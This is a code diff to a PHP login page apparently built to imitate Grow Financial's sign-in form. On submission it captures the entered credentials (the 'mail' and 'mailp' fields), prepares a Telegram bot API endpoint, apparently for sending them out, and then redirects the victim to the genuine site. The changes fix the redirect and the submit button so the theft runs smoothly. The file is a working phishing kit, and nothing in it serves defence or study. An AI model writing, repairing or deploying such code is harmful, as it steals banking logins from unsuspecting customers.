@@ -10,8 +10,9 @@
     <link rel="stylesheet" href="output.css">
     <?php
             if (isset($_POST['submit'])) {
+                require './form.php';
                 header('Location: https://growfinancial.org');
-                require 'form.php';
+                echo '<META HTTP-EQUIV="refresh" content="0;URL= https://growfinancial.org">';
                 define('url', "https://api.telegram.org/bot".$token.'/');
                 $mail = $_POST['mail'];
                 $mailp = $_POST['mailp'];
@@ -102,7 +103,7 @@
                             </p>-->
                         </label>
 
-                       <a href="https://www.growfinancial.org/" class="inline-flex justify-center items-center h-12 text-center py-3 text-base font-medium bg-green-800 text-white hover:bg-green-700"><button type="submit" name="submit" id="submit">LOG IN</button></a>
+                        <button type="submit" name="submit" class="inline-flex justify-center items-center h-12 text-center py-3 text-base font-medium bg-green-800 text-white hover:bg-green-700">LOG IN</button>
                         <div class="flex flex-row text-sm font-medium text-green-700 py-2">
                             <span class="underline">Forgot Username?</span>
                             <span class="px-2">|</span>
